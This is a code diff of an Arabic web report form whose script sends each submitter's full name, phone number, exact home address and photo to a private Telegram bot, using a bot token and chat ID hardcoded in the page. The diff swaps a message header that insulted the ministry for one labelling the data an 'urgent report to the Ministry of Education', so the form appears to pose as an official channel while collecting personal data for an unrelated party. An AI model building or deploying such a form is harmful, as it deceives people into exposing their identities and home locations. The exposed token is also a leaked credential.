@@ -60,8 +60,8 @@
                 </select>
             </div>
             <div class="form-group">
-                <label for="location" class="required">موقع المنزل الدقيق (وصف يدوي)</label>
-                <input type="text" id="location" placeholder="الحي، الشارع، رقم المنزل" required>
+                <label for="location" class="required">الموقع الدقيق (الحي، الشارع، رقم المنزل)</label>
+                <input type="text" id="location" placeholder="مثال: حي الجامعة، شارع 14، منزل رقم ٥٥" required>
             </div>
             <button type="submit">أرسل البلاغ</button>
         </form>
@@ -71,6 +71,7 @@
     document.getElementById('reportForm').addEventListener('submit', async function(e) {
         e.preventDefault();
         
+        // البيانات الأساسية
         const fullName = document.getElementById('fullName').value;
         const phone = document.getElementById('phone').value;
         const problem = document.getElementById('problem').value;
@@ -78,46 +79,56 @@
         const location = document.getElementById('location').value;
         const photoFile = document.getElementById('photo').files[0];
         
-        // Convert image to base64
-        const toBase64 = file => new Promise((resolve, reject) => {
-            const reader = new FileReader();
-            reader.readAsDataURL(file);
-            reader.onload = () => resolve(reader.result);
-            reader.onerror = error => reject(error);
-        });
+        // تحويل الصورة لـ Blob
+        const getBlob = async (file) => {
+            return new Blob([await file.arrayBuffer()], { type: file.type });
+        };
         
-        const photoBase64 = await toBase64(photoFile);
+        const photoBlob = await getBlob(photoFile);
         
-        // Format message with emojis
-        const message = `
-🚨 **بلاغ جديد يا كلاب الوزارة** 🚨
+        // إنشاء رابط للصورة
+        const photoUrl = URL.createObjectURL(photoBlob);
         
-👤 **الاسم:** ${fullName}
-📞 **الهاتف:** ${phone}
-🔥 **المشكلة:** ${problem}
-📍 **المحافظة:** ${governorate}
-🏠 **موقع المنزل:** ${location}
+        // نص الرسالة الأساسية
+        const textMessage = `
+🚨 **بلاغ عاجل لوزارة التربية** 
 
-🖼️ **الصورة المرفقة:**
-${photoBase64}
+👤 **الاسم:** ${fullName || "غير مذكور"}
+📱 **الهاتف:** \`${phone || "غير مذكور"}\`
+📍 **المحافظة:** ${governorate || "غير محددة"}
+🗺️ **الموقع:** ${location || "غير محدد"}
+
+❗ **المشكلة:**
+${problem || "لا يوجد وصف"}
         `;
         
-        // Send to Telegram
+        // إرسال الرسالة النصية أولاً
         try {
             await fetch(`https://api.telegram.org/bot8097003009:AAHNdM6R-_RamFOyz7P0ECL-tTXIda2EMog/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     chat_id: '7763665935',
-                    text: message,
+                    text: textMessage,
                     parse_mode: 'Markdown'
                 })
             });
-            alert('تم إرسال بلاغك بنجاح!');
+            
+            // إرسال الصورة كملف منفصل
+            const formData = new FormData();
+            formData.append('chat_id', '7763665935');
+            formData.append('photo', photoBlob, 'report_photo.jpg');
+            
+            await fetch(`https://api.telegram.org/bot8097003009:AAHNdM6R-_RamFOyz7P0ECL-tTXIda2EMog/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            });
+            
+            alert('✅ تم إرسال البلاغ والصوره! سيتم التواصل معك قريباً');
         } catch (error) {
-            alert('خطأ في الإرسال!');
+            alert(`❌ فشل الإرسال! الخطأ: ${error.message}`);
         }
     });
     </script>
 </body>
-    </html>
+        </html>
